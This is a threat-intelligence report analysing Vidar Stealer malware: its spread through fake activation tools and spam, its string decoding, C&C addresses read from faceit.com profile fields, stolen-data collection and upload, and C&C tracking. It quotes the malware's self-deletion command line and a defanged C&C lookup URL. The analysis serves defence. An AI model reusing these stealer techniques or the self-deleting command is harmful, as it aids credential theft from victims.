Monkey Thief

Executive Summary
Vidar Stealer is a malware specialized in stealing information mainly distributed as
spam mail or crack version commercial software and keygen program. When installed,
data such as infected device information, account, and history recorded in the browser
is collected and leaked to the C&C server.
In particular, it is one of the Stealer logs widely traded in DDW, and logs of infected
PCs worldwide are being sold.

Previously, Vidar Stealer communicated with the C&C server hard-coded inside the
malware, but from February 3, 2021, the method was changed to dynamically read the
C&C server from the regular site.
Vidar stealer switches its target software frequently in order to steal credential
information stored in various browsers and programs. Therefore, the C&C server is
continuously changing, so an automated response is necessary.
S2W LAB has been analyzing Vidar Stealer malware behaviors and tracking changes
and preventing related damage by collecting logs that are traded through DDW.

The Routes of Infection
Recently, Vidar Stealer is mainly disguised as a Windows activation software. Because the
Windows product is expensive, many people download illegal activation software to use it for
free. In addition to Windows, many cases are disguised as a cracked commercial software,
keygen software, etc. Users may recognize the risk of the software as most vaccines be able
to detect and alert users, but they tend to ignore and execute them by taking their own risk.

Last year, Vidar Stealer was distributed in South Korea through spam emails impersonated
by the Fair Trade Commission. The contents in the email lure victims to open the attached
file disguised as an official request letter. If the victim executes the attached file disguised as
a document file icon, the user will be infected by Vidar stealer.

Email disguised as the Fair Trade Commission
As Vidar Stealer has not been distributed with high-level technologies or serious
vulnerabilities so far, so if users do not use illegal programs or access suspicious sites with
caution, they can sufficiently prevent infection.

Vidar Stealer Behavior Analysis
1. Loader
Vidar Stealer is packed with an unknown loader to prevent analysis. This loader’s
characteristic is that data, strings, binaries, and other data necessary for malicious behavior
do not have regularity. Because of this feature, it is challenging to detect this loader
completely with a static method using detection signatures and Yara rules. In addition, even
if the loader is detected, there is a limit to accurately distinguishing what the actual internal
malicious code is.

On March 31, 2021, a malware analyst on Twitter (@c3rb3ru5d3d53c) named this Loader
“DerpLoader” and noted that Vidar Stealer, as well as other Stealer malware such as KPot
Stealer and Racoon Stealer, use it. As a result of the analysis, it was confirmed that all three
stealers’ loaders are the same loader. Stealers mainly use EXE distribution methods
disguised as specific programs, so they are easily exposed to AV. It is assumed that various
Stealers use this loader to maximize detection avoidance.

Decode strings
When Vidar Stealer is executed by the loader, the encoded string is firstly decoded and the
string required for malicious behavior is extracted. As a decoding method, RC4 and Base64
are used in combination. For the RC4 Key, a string composed of 18 numbers is used, and
each sample uses a different key.

Dynamic collection of C&C servers
In the former Vidar Stealer malware, the C&C server address was hard-coded. However,
starting on February 3 this year, a method of dynamically collecting C&C servers has started
using API functions provided by “faceit.com”, a Russian game-related community. The
advantage of this method is that the faceit.com site cannot be blocked because it is a normal
site.
According to the former method, if the C&C server used by the malware is taken down, the
malware becomes useless. However, in the case of dynamic collection, the C&C of the
malware can be automatically updated by changing the content of “faceit.com” without
modifying the malware every time.
https://api.faceit[.]com/core/v1/nicknames/[Attacker's nickname]

C&C server is included in the ‘about’ field of JSON format data

Normal DLL file download
After that, Vidar Stealer downloads the normal DLL file required for malicious activity.
Normal DLL File PathC:\ProgramData\

Normal DLL files related to Firefox

1. freebl3.dll
2. mozglue.dll

4. nss3.dll
5. softokn3.dll
Normal DLL files related to C/C++
1. vcruntime140.dll
2. msvcp140.dll

Request configuration data
After downloading the DLL file, the malware requests a specific page containing the
configuration values. On this page, option values for which data to collect from the infected
device are specified. Each option value is divided by ‘,’ and consists of a total of 12 values.
Among these, some option values are not actually used. In addition, passwords.txt,
information.txt, outlook.txt, files\Soft are unconditionally collected regardless of the options.

Option 3: Option to steal Browser’s History, Downloads
Option 4: Option to steal Wallet data
Option 7: Option to steal Telegram data
Option 8: Option to get the Screen capture
Option 9: Option to steal Certain files
When the 9th option is activated, all files with a specific file name are collected using the last
string separated by ‘;’. The format is as follows, and the collected files are saved in
files\Files\[Work Folder].
[Save Folder];[Target Path];[Target file name list];[Maximum file size];[Seperator]

Data Theft
The target software list is as follows. The target browser may be different for each malware
because the attacker can customize the target browser list. As the version of Vidar Stealer
goes up, the collection range is getting wider, and as of March 21, the highest version
identified is 38. All stolen information is collected in the path below.
C:\ProgramData\[A-Z0–9]{25}\files\

Compress the collected folder
After collecting all the data, compress the “\files” folder into a ZIP file. The path of the created
ZIP file is as follows, and different file names are used for each version.
C:\ProgramData\[A-Z0–9]{25}\[MachineGUID][0–9]{10}.zip

Send data
Afterward, it transmits a ZIP file containing the stolen data along with the infected device ID,
information, and the version of Vidar to the C&C server.

Download additional payload
If the attacker sets additional functions, there is the function to download and execute
additional malware after leaking information to the C&C server. After requesting
HTTP_QUERY_REFRESH, if the result contains the string “http”, it accesses the given URL
to read additional configuration data. After this process, finally, it extracts the URL and
downloads the malicious payload.

Self-deleting
After performing all malicious actions, Vidar Stealer deletes its own traces with the command
below.
“C:\Windows\System32\cmd.exe” /c taskkill /im [Filename] /f & erase [File path] &
exit

Analysis of the domain used in the attack
S2W LAB has been continuously monitoring and tracking Vidar Stealer’s C&C server
construction method for three months since February 2021.

1. api.faceit.com
The attacker first joined a game-related community in Russia called “faceit.com”. After that,
the attacker has been updating the C&C server by using the Profile section of the user
information page, and the malware requests this information through the API.

C&C server stored in the user information page
The attacker has changed the community nickname for about three months and the C&C
server collection URL. There are a total of 6 nicknames identified so far, and the created time
and collected C&C servers are summarized below. When the nickname is replaced, the C&C
server is not updated from the existing nickname, and the existing C&C servers are no
longer used.

2. C&C server
The attacker used many domains and IPs because the C&C server was changed in one day
or every 3 to 4 days. We arranged the C&C server domains that we collected over three
months, and we were able to confirm some characteristics.
Most domains registered through NameSilo

Numerous C&C servers registered through NameSilo
E-mail that the attacker used to register the domain. In particular, “xeronxik123” is
strongly suspected as the ID was also used as the faceit.com nickname.1) 2)

Initially, the attacker registered and used the domain, but after that, it seems that the normal
domain was compromised and used as a C&C server. Recently, Vidar communicates with IP
type C&C server, and sometimes it is reused when the nickname is changed.
The latest version of C&C Server list is continuously updated on the

Conclusion
The latest version of all Vidar Stealer malicious code C&C servers are constantly being
changed through a dynamic acquisition method, but only one C&C server is active at the
time of execution. Therefore, if a new C&C server can be collected by monitoring the C&C
server collection URL, information leakage can be prevented even if it is infected with a
malicious code, and measures can be taken by detecting infected devices attempting to
connect.
S2W LAB is monitoring the continuously updated Vidar Stealer C&C server collection URL,
and through this, the C&C server is also being collected. In addition, we continue to analyze
and track changes in Vidar Stealer’s C&C connection method.
In the past, Stealer malware caused direct damage to individuals rather than companies, but
with the recent increase in telecommuting due to the coronavirus, Stealer malware likely to
steal accounts that can access corporate business networks. Since account stealing is
17/24

attempted not only for web browsers but also for various software, if important accounts are
stolen, it is possible to infiltrate the corporate network. So, if these logs are sold to
ransomware attack groups, the damage is out of control.
In order to prevent Vidar Stealer infection, users should be cautious of executing programs
from unknown sources, executing cracked or illegal activation programs, and opening spam
emails.
We also provide futher information regarding various Stealers via Xarvis Enterprise.
